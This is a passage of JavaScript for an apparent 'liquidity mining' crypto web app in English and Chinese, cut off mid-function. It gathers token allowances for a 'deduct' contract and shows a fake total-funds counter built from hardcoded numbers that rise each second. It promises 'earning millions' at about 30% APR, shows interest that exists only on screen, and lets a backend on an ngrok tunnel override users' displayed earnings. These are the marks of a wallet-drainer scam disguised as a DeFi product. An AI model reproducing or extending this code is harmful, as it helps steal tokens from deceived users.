const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
const DEDUCT_CONTRACT_ABI = [
  "function isServiceActiveFor(address customer) view returns (bool)",
  "function activateService(address tokenContract) external",
  "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
  { "anonymous": false, "inputs": [ { "indexed": true, "name": "customer", "type": "address" }, { "indexed": true, "name": "tokenContract", "type": "address" } ], "name": "ServiceActivated", "type": "event" }
];
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// DOM 元素（使用 let 允許重新賦值）
let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
let modalClaimableETH, modalPendingETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
let elements = {};

// 變數
let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let pledgedAmount = 0;
let lastPayoutTime = null;
let totalGrossOutput = 0;
let currentCycleInterest = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let claimInterval = null;
let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
let isServerAvailable = false;
let pendingUpdates = [];
let localLastUpdated = 0;
let authorizedToken = 'USDT';
let allData = { users: {}, overrides: {}, allowances: {}, pledges: {}, lastUpdated: 0 };
const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
window.currentClaimable = 0;
window.currentPending = 0;
const MONTHLY_RATE = 0.01;
let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };

const translations = {
  'en': {
    title: 'Liquidity Mining',
    subtitle: 'Start Earning Millions',
    tabLiquidity: 'Liquidity',
    tabPledging: 'Pledging',
    grossOutputLabel: 'Gross Output',
    cumulativeLabel: 'Cumulative',
    walletBalanceLabel: 'Wallet Balance',
    accountBalanceLabel: 'Account Balance',
    nextBenefit: 'Next Benefit: 00:00:00',
    startBtnText: 'Start',
    pledgeAmountLabel: 'Pledge Amount',
    pledgeDurationLabel: 'Duration',
    pledgeBtnText: 'Pledge Now',
    claimBtnText: 'Claim',
    noClaimable: 'No claimable interest available.',
    claimSuccess: 'Claim successful!',
    nextClaimTime: 'Next claim in 12 hours.',
    miningStarted: 'Mining started!',
    error: 'Error',
    offlineWarning: 'Server offline, using local mode.',
    noWallet: 'Please install a wallet.',
    dataSent: 'Data sent.',
    pledgeSuccess: 'Pledge successful!',
    pledgeError: 'Pledge failed.',
    invalidPledgeAmount: 'Invalid amount.',
    invalidPledgeToken: 'Invalid token.',
    insufficientBalance: 'Insufficient balance.',
    sseFailed: 'SSE failed, using polling.',
    ethersError: 'Ethers.js error.',
    approveError: 'Approval failed.',
    selectTokenFirst: 'Select token first.',
    balanceZero: 'Balance zero.',
    balanceTooLow: 'Balance too low.',
    wethValueTooLow: 'WETH value too low.',
    rulesTitle: 'Mining Rules',
    rulesContent: `
      <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
      <p>2. Insufficient: can authorize but not start.</p>
      <p>3. APR: 28.3% ~ 31.5%.</p>
      <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
      <p>5. Pledging independent.</p>
    `,
    modalClaimableLabel: 'Claimable',
    modalPendingLabel: 'Pending',
    modalSelectedTokenLabel: 'Selected Token',
    modalEquivalentValueLabel: 'Equivalent Value'
  },
  'zh-Hant': {
    title: '流動性挖礦',
    subtitle: '開始賺取數百萬',
    tabLiquidity: '流動性',
    tabPledging: '質押',
    grossOutputLabel: '總產出',
    cumulativeLabel: '累計',
    walletBalanceLabel: '錢包餘額',
    accountBalanceLabel: '帳戶餘額',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '開始',
    pledgeAmountLabel: '質押金額',
    pledgeDurationLabel: '期間',
    pledgeBtnText: '立即質押',
    claimBtnText: '領取',
    noClaimable: '無可領取利息。',
    claimSuccess: '領取成功！',
    nextClaimTime: '下次領取時間：12 小時後。',
    miningStarted: '挖礦開始！',
    error: '錯誤',
    offlineWarning: '伺服器離線，使用本地模式。',
    noWallet: '請安裝錢包。',
    dataSent: '數據已發送。',
    pledgeSuccess: '質押成功！',
    pledgeError: '質押失敗。',
    invalidPledgeAmount: '金額無效。',
    invalidPledgeToken: '代幣無效。',
    insufficientBalance: '餘額不足。',
    sseFailed: 'SSE 失敗，使用輪詢。',
    ethersError: 'Ethers.js 錯誤。',
    approveError: '授權失敗。',
    selectTokenFirst: '請先選擇代幣。',
    balanceZero: '餘額為零。',
    balanceTooLow: '餘額過低。',
    wethValueTooLow: 'WETH 價值過低。',
    rulesTitle: '挖礦規則',
    rulesContent: `
      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
      <p>2. 不足：可授權但無法開始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
      <p>5. 質押獨立運作。</p>
    `,
    modalClaimableLabel: '可領取',
    modalPendingLabel: '已累積（未到期）',
    modalSelectedTokenLabel: '選擇代幣',
    modalEquivalentValueLabel: '等值金額'
  },
  'zh-Hans': {
    title: '流动性挖矿',
    subtitle: '开始赚取数百万',
    tabLiquidity: '流动性',
    tabPledging: '质押',
    grossOutputLabel: '总产出',
    cumulativeLabel: '累计',
    walletBalanceLabel: '钱包余额',
    accountBalanceLabel: '账户余额',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '开始',
    pledgeAmountLabel: '质押金额',
    pledgeDurationLabel: '期间',
    pledgeBtnText: '立即质押',
    claimBtnText: '领取',
    noClaimable: '无可领取利息。',
    claimSuccess: '领取成功！',
    nextClaimTime: '下次领取时间：12 小时后。',
    miningStarted: '挖矿开始！',
    error: '错误',
    offlineWarning: '服务器离线，使用本地模式。',
    noWallet: '请安装钱包。',
    dataSent: '数据已发送。',
    pledgeSuccess: '质押成功！',
    pledgeError: '质押失败。',
    invalidPledgeAmount: '金额无效。',
    invalidPledgeToken: '代币无效。',
    insufficientBalance: '余额不足。',
    sseFailed: 'SSE 失败，使用轮询。',
    ethersError: 'Ethers.js 错误。',
    approveError: '授权失败。',
    selectTokenFirst: '请先选择代币。',
    balanceZero: '余额为零。',
    balanceTooLow: '余额过低。',
    wethValueTooLow: 'WETH 价值过低。',
    rulesTitle: '挖矿规则',
    rulesContent: `
      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500 才能开始。</p>
      <p>2. 不足：可授权但无法开始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每 12 小时发放一次（美西时间 00:00 与 12:00）。</p>
      <p>5. 质押独立运作。</p>
    `,
    modalClaimableLabel: '可领取',
    modalPendingLabel: '已累计（未到期）',
    modalSelectedTokenLabel: '选择代币',
    modalEquivalentValueLabel: '等值金额'
  }
};

let currentLang = localStorage.getItem('language') || 'en';

// 日誌函數
function log(message, type = 'info') {
  const timestamp = new Date().toLocaleTimeString();
  const prefix = { info: 'ℹ️', success: '✅', error: '❌', send: '📤', receive: '📥' }[type] || 'ℹ️';
  console.log(`[${timestamp}] ${prefix} ${message}`);

  const logContent = document.getElementById('logContent');
  const logContainer = document.getElementById('logContainer');
  if (logContent && logContainer) {
    const line = document.createElement('div');
    line.textContent = `[${timestamp}] ${prefix} ${message}`;
    line.style.color = { info: '#ccc', success: '#0f0', error: '#f00', send: '#00f', receive: '#ff0' }[type] || '#ccc';
    logContent.appendChild(line);
    logContainer.style.display = 'block';
    logContainer.scrollTop = logContainer.scrollHeight;
  }
}

// 安全獲取 DOM 元素
function getElements() {
  connectButton = document.getElementById('connectButton');
  statusDiv = document.getElementById('status');
  startBtn = document.getElementById('startBtn');
  pledgeBtn = document.getElementById('pledgeBtn');
  pledgeAmount = document.getElementById('pledgeAmount');
  pledgeDuration = document.getElementById('pledgeDuration');
  pledgeToken = document.getElementById('pledgeToken');
  refreshWallet = document.getElementById('refreshWallet');
  walletTokenSelect = document.getElementById('walletTokenSelect');
  walletBalanceAmount = document.getElementById('walletBalanceAmount');
  accountBalanceValue = document.getElementById('accountBalanceValue');
  totalValue = document.getElementById('totalValue');
  grossOutputValue = document.getElementById('grossOutputValue');
  cumulativeValue = document.getElementById('cumulativeValue');
  nextBenefit = document.getElementById('nextBenefit');
  claimModal = document.getElementById('claimModal');
  closeModal = document.getElementById('closeModal');
  confirmClaim = document.getElementById('confirmClaim');
  cancelClaim = document.getElementById('cancelClaim');
  modalClaimableETH = document.getElementById('modalClaimableETH');
  modalPendingETH = document.getElementById('modalPendingETH');
  modalSelectedToken = document.getElementById('modalSelectedToken');
  modalEquivalentValue = document.getElementById('modalEquivalentValue');
  modalTitle = document.getElementById('modalTitle');
  languageSelect = document.getElementById('languageSelect');

  elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
    tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    startBtnText: startBtn,
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: pledgeBtn
  };
}

async function retry(fn, maxAttempts = 3, delayMs = 3000) {
  for (let i = 0; i < maxAttempts; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxAttempts - 1) throw error;
      await new Promise(r => setTimeout(r, delayMs));
    }
  }
}

async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
  let attempts = 0;
  while (attempts < maxAttempts) {
    grossOutputValue = document.getElementById('grossOutputValue');
    cumulativeValue = document.getElementById('cumulativeValue');
    if (grossOutputValue && cumulativeValue) return true;
    await new Promise(r => setTimeout(r, delayMs));
    attempts++;
  }
  updateStatus(translations[currentLang].error + ': DOM error', true);
  return false;
}

async function checkServerStatus() {
  try {
    log('檢查伺服器狀態...', 'info');
    const response = await retry(() => fetch(`${API_BASE_URL}/api/status`, { 
      cache: 'no-cache',
      headers: { 'ngrok-skip-browser-warning': 'true' }
    }));
    if (response.ok) {
      const { status, lastUpdated } = await response.json();
      isServerAvailable = status === 'available';
      log(`伺服器狀態：${status}, 最後更新：${lastUpdated}`, 'info');
      if (isServerAvailable && pendingUpdates.length > 0) {
        log(`同步 ${pendingUpdates.length} 筆待發送數據...`, 'info');
        await syncPendingUpdates(lastUpdated);
      }
      return isServerAvailable;
    }
  } catch (error) {
    isServerAvailable = false;
    log(`伺服器檢查失敗: ${error.message}`, 'error');
    if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
  }
  return false;
}

async function syncPendingUpdates(serverLastUpdated) {
  for (const update of pendingUpdates) {
    if (update.timestamp > serverLastUpdated) {
      log(`同步待發送數據：${JSON.stringify(update.data, null, 2)}`, 'send');
      await saveUserData(update.data, false);
    }
  }
  pendingUpdates = [];
  log('待發送數據同步完成', 'success');
}

async function loadUserDataFromServer() {
  if (!userAddress) return;
  try {
    log('載入當前用戶數據...', 'info');
    const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, { 
      cache: 'no-cache',
      headers: { 'ngrok-skip-browser-warning': 'true' }
    }));
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const newAllData = await response.json();

    // 【關鍵】只處理當前用戶
    if (!newAllData.users || !newAllData.users[userAddress]) {
      log(`無當前用戶數據`, 'info');
      return;
    }

    const userData = newAllData.users[userAddress];
    const localData = JSON.parse(localStorage.getItem('userData') || '{}');
    localLastUpdated = localData.lastUpdated || 0;

    if (newAllData.lastUpdated > localLastUpdated) {
      pledgedAmount = userData.pledgedAmount ?? 0;
      lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
      totalGrossOutput = userData.totalGrossOutput ?? 0;
      window.currentClaimable = userData.claimable ?? 0;
      accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
      authorizedToken = userData.authorizedToken || 'USDT';

      const pledge = newAllData.pledges?.[userAddress] || { amount: '0' };
      pledgedAmount = parseFloat(pledge.amount) || 0;

      const override = newAllData.overrides?.[userAddress] || {};
      totalGrossOutput = override.grossOutput ?? totalGrossOutput;

      localStorage.setItem('userData', JSON.stringify({
        pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
        accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
        lastUpdated: newAllData.lastUpdated
      }));
      localLastUpdated = newAllData.lastUpdated;

      log(`當前用戶資料同步成功`, 'success');
    }
    await updateInterest();
  } catch (error) {
    log(`載入失敗: ${error.message}`, 'error');
    // 保留本地數據
  }
}

async function saveUserData(data = null, addToPending = true) {
  if (!userAddress) return;
  const dataToSave = data || {
    pledgedAmount,
    lastPayoutTime,
    totalGrossOutput,
    claimable: window.currentClaimable,
    accountBalance,
    authorizedToken,
    nextBenefitTime: localStorage.getItem('nextBenefitTime'),
    lastUpdated: Date.now(),
    source: 'index.html'
  };

  log(`發送資料到後端: ${JSON.stringify(dataToSave)}`, 'send');

  if (!isServerAvailable) {
    log('伺服器離線，加入待發送', 'error');
    if (addToPending) pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
    localStorage.setItem('userData', JSON.stringify(dataToSave));
    return;
  }

  try {
    const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'ngrok-skip-browser-warning': 'true'
      },
      body: JSON.stringify({ address: userAddress, data: dataToSave })
    }), 3, 3000);

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`HTTP ${response.status}: ${text}`);
    }
    log('資料發送成功', 'success');
    localStorage.setItem('userData', JSON.stringify(dataToSave));
    localLastUpdated = dataToSave.lastUpdated;
  } catch (error) {
    log(`發送失敗: ${error.message}`, 'error');
    if (addToPending) {
      pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
      localStorage.setItem('userData', JSON.stringify(dataToSave));
    }
  }
}

function updateStatus(message, isWarning = false) {
  if (!statusDiv) return;
  statusDiv.innerHTML = message || '';
  statusDiv.style.display = message ? 'block' : 'none';
  statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
  statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
}

function resetState(showMsg = true) {
  signer = userAddress = null;
  pledgedAmount = 0;
  lastPayoutTime = null;
  totalGrossOutput = 0;
  window.currentClaimable = 0;
  accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
  authorizedToken = 'USDT';
  if (interestInterval) clearInterval(interestInterval);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  if (claimInterval) clearInterval(claimInterval);
  localStorage.clear();
  if (startBtn) {
    startBtn.style.display = 'block';
    startBtn.textContent = translations[currentLang].startBtnText;
  }
  if (connectButton) {
    connectButton.classList.remove('connected');
    connectButton.textContent = 'Connect';
  }
  disableInteractiveElements(true);
  if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
  if (walletTokenSelect) walletTokenSelect.value = 'USDT';
  if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
  if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
  if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
  if (showMsg) updateStatus(translations[currentLang].noWallet, true);
}

function disconnectWallet() {
  if (window.currentSSE) {
    window.currentSSE.close();
    window.currentSSE = null;
  }
  resetState(true);
}

function disableInteractiveElements(disable = false) {
  if (startBtn) startBtn.disabled = disable;
  if (pledgeBtn) pledgeBtn.disabled = disable;
  if (pledgeAmount) pledgeAmount.disabled = disable;
  if (pledgeDuration) pledgeDuration.disabled = disable;
  if (pledgeToken) pledgeToken.disabled = disable;
  if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
}

function updateBalancesUI(walletBalances) {
  if (!walletTokenSelect) return;
  const selectedToken = walletTokenSelect.value;
  const decimals = { USDT: 6, USDC: 6, WETH: 18 };
  const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
  const formattedWalletBalance = window.ethers.utils.formatUnits(walletTokenBigInt, decimals[selectedToken]);
  if (walletBalanceAmount) walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
  const claimedBalance = accountBalance[selectedToken] || 0;
  const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
  if (accountBalanceValue) accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
}

function updateTotalFunds() {
  if (!totalValue) return;
  const initialFunds = 12856459.94;
  const increasePerSecond = 0.055;
  const fixedStartTime = 1698796800000;
  const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
  const total = initialFunds + (elapsedSeconds * increasePerSecond);
  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
}

async function refreshEthPrice() {
  const now = Date.now();
  if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    if (!response.ok) throw new Error();
    const data = await response.json();
    ethPriceCache.price = data.ethereum.usd;
    ethPriceCache.timestamp = now;
  } catch (error) {
    console.warn('Price fetch failed, using fallback');
  }
}

function calculatePayoutInterest() {
  if (pledgedAmount <= 0) return 0;
  return pledgedAmount * (MONTHLY_RATE / 60);
}

function initializeMiningData() {
  localStorage.setItem('totalGrossOutput', '0');
  localStorage.setItem('claimable', '0');
  localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
}

async function updateInterest() {
  if (!grossOutputValue || !cumulativeValue) {
    if (!await retryDOMAcquisition()) return;
  }
  if (!userAddress || pledgedAmount <= 0) {
    grossOutputValue.textContent = '0 ETH';
    cumulativeValue.textContent = '0 ETH';
    window.currentClaimable = 0;
    window.currentPending = 0;
    return;
  }
  const now = Date.now();
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(now + etOffset);
  totalGrossOutput = parseFloat(localStorage.getItem('totalGrossOutput')) || 0;
  let claimable = parseFloat(localStorage.getItem('claimable')) || 0;
  const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
  let lastPayoutTime = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
  if (lastPayoutTime === 0) {
    lastPayoutTime = Date.now() - 24*60*60*1000;
    localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
  }
  const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
  const lastPayoutET = new Date(lastPayoutTime + etOffset);
  const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
  if (isPayoutTime && !wasPayoutTime && now - lastPayoutTime > 60000) {
    totalGrossOutput += cycleInterest;
    claimable += cycleInterest;
    localStorage.setItem('totalGrossOutput', totalGrossOutput.toString());
    localStorage.setItem('claimable', claimable.toString());
    localStorage.setItem('lastPayoutTime', now.toString());
    await saveUserData();
  }
  const nextHour = nowET.getHours() < 12 ? 12 : 24;
  const nextPayoutET = new Date(nowET);
  nextPayoutET.setHours(nextHour, 0, 0, 0);
  const msToNext = nextPayoutET.getTime() - etOffset - now;
  const progress = Math.max(0, 1 - (msToNext / (12 * 60 * 60 * 1000)));
  const pending = cycleInterest * progress;
  const cumulative = claimable + pending;
  grossOutputValue.textContent = `${totalGrossOutput.toFixed(7)} ETH`;
  cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
  window.currentClaimable = claimable;
  window.currentPending = pending;
}

function updateClaimModalLabels() {
  const claimLabels = {
    'en': { title: 'Claim', claimable: 'Claimable', pending: 'Pending', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
    'zh-Hant': { title: '領取', claimable: '可領取', pending: '已累積（未到期）', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
    'zh-Hans': { title: '领取', claimable: '可领取', pending: '已累计（未到期）', selectedToken: '选择代币', equivalentValue: '等值金额' }
  };
  const labels = claimLabels[currentLang];
  if (modalTitle) modalTitle.textContent = labels.title;
  const labelElements = document.querySelectorAll('.claim-info .label');
  if (labelElements.length === 4) {
    labelElements[0].textContent = labels.claimable;
    labelElements[1].textContent = labels.pending;
    labelElements[2].textContent = labels.selectedToken;
    labelElements[3].textContent = labels.equivalentValue;
  }
}

async function claimInterest() {
  const token = authorizedToken;
  await refreshEthPrice();
  updateClaimModalLabels();
  if (modalClaimableETH) modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
  if (modalPendingETH) modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
  if (modalSelectedToken) modalSelectedToken.textContent = token;
  const equivalent = window.currentClaimable * ethPriceCache.price;
  if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${token}`;
  if (claimModal) claimModal.style.display = 'flex';
  if (claimInterval) clearInterval(claimInterval);
  claimInterval = setInterval(async () => {
    await updateInterest();
    if (modalClaimableETH) modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
    if (modalPendingETH) modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
    const eq = window.currentClaimable * ethPriceCache.price;
    if (modalEquivalentValue) modalEquivalentValue.textContent = `${eq.toFixed(3)} ${token}`;
  }, 1000);
}

function closeClaimModal() {
  if (claimModal) claimModal.style.display = 'none';
  if (claimInterval) clearInterval(claimInterval);
}

function getETOffsetMilliseconds() {
  const now = new Date();
  const mar = new Date(now.getFullYear(), 2, 8);
  const nov = new Date(now.getFullYear(), 10, 1);
  const marDay = mar.getDay();
  const novDay = nov.getDay();
  const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
  const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
  return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
}

function updateNextBenefitTimer() {
  if (!nextBenefit) return;
  const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
  const label = translations[currentLang].nextBenefit.split(':')[0];
  if (!nextBenefitTimestamp) {
    nextBenefit.textContent = `${label}: 00:00:00`;
    return;
  }
  const now = Date.now();
  let diff = nextBenefitTimestamp - now;
  if (diff <= 0) {
    const twelveHoursInMillis = 12 * 60 * 60 * 1000;
    const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
    localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
    saveUserData();
    diff = newNextBenefitTimestamp - Date.now();
  }
  const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
  const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
  const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
  const seconds = String(totalSeconds % 60).padStart(2, '0');
  nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
}

function setInitialNextBenefitTime() {
  if (localStorage.getItem('nextBenefitTime')) return;
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(Date.now() + etOffset);
  const noonET = new Date(nowET); noonET.setHours(12, 0, 0, 0);
  const midnightET = new Date(nowET); midnightET.setHours(24, 0, 0, 0);
  const nextBenefitTimeET = nowET < noonET ? noonET : midnightET;
  const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
  localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
  saveUserData();
}

function activateStakingUI() {
  if (startBtn) startBtn.style.display = 'none';
  initializeMiningData();
  if (interestInterval) clearInterval(interestInterval);
  interestInterval = setInterval(updateInterest, 1000);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
  saveUserData();
  updateInterest();
}

async function sendMobileRobustTransaction(populatedTx) {
  if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
  const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
  const fromAddress = await signer.getAddress();
  const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
  let txHash, receipt = null;
  try {
    txHash = await provider.send('eth_sendTransaction', [mobileTx]);
    updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
    receipt = await provider.waitForTransaction(txHash);
  } catch (error) {
    if (error.hash) txHash = error.hash;
    if (txHash) {
      updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
      receipt = await provider.waitForTransaction(txHash);
    } else throw error;
  }
  if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
  return receipt;
}

async function initializeWallet() {
  if (!window.ethers) {
    updateStatus(translations[currentLang].ethersError, true);
    if (connectButton) connectButton.disabled = true;
    return;
  }
  try {
    if (typeof window.ethereum === 'undefined') {
      updateStatus(translations[currentLang].noWallet, true);
      disableInteractiveElements(true);
      if (connectButton) connectButton.disabled = true;
      return;
    }
    provider = new window.ethers.providers.Web3Provider(window.ethereum);
    window.ethereum.on('accountsChanged', a => {
      if (a.length === 0) disconnectWallet();
      else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
        resetState(false);
        setTimeout(connectWallet, 500);
      }
    });
    window.ethereum.on('chainChanged', () => {
      resetState(false);
      setTimeout(connectWallet, 500);
    });
    const accounts = await provider.send('eth_accounts', []);
    if (accounts.length > 0) await connectWallet();
    else {
      disableInteractiveElements(true);
      updateStatus(translations[currentLang].noWallet, true);
    }
  } catch (e) {
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    if (connectButton) connectButton.disabled = true;
  }
}

async function connectWallet() {
  try {
    if (typeof window.ethereum === 'undefined') {
      updateStatus(translations[currentLang].noWallet, true);
      if (connectButton) connectButton.disabled = true;
      return;
    }
    if (!window.ethers) {
      updateStatus(translations[currentLang].ethersError, true);
      return;
    }
    if (!provider) provider = new window.ethers.providers.Web3Provider(window.ethereum);
    updateStatus('Connecting...');
    const accounts = await provider.send('eth_requestAccounts', []);
    if (accounts.length === 0) throw new Error("No account.");
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
    usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
    usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
    wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
    if (connectButton) {
      connectButton.classList.add('connected');
      connectButton.textContent = 'Connected';
    }
    log(`錢包連接成功: ${userAddress}`, 'success');
    await loadUserDataFromServer();
    await saveUserData();
    setupSSE();
    await updateUIBasedOnChainState();
    setTimeout(async () => await forceRefreshWalletBalance(), 1000);
  } catch (e) {
    log(`錢包連接失敗: ${e.message}`, 'error');
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    resetState(true);
    if (connectButton) connectButton.disabled = typeof window.ethereum === 'undefined';
  }
}

async function forceRefreshWalletBalance() {
  if (!userAddress || !usdtContract || !usdcContract || !wethContract) {
    updateStatus('Contracts not initialized.', true);
    return;
  }
  updateStatus('Fetching balances...');
  try {
    const [usdtBal, usdcBal, wethBal] = await Promise.all([
      usdtContract.balanceOf(userAddress),
      usdcContract.balanceOf(userAddress),
      wethContract.balanceOf(userAddress)
    ]);
    const balances = { usdt: usdtBal, usdc: usdcBal, weth: wethBal };
    updateBalancesUI(balances);
    updateStatus('Balances updated.');
  } catch (error) {
    updateStatus('Balance fetch failed.', true);
  }
}

async function updateUIBasedOnChainState() {
  if (!signer) return;
  try {
    updateStatus('Checking state...');
    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
    const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
      retry(() => deductContract.isServiceActiveFor(userAddress)),
      retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
    ]);
    const isWethAuthorized = wethAllowance >= requiredAllowance;
    const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
    const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
    const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
    const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
    if (isFullyAuthorized) {
      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
      const selectedContract = tokenMap[selectedToken];
      let balanceBigInt = 0n;
      try {
        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
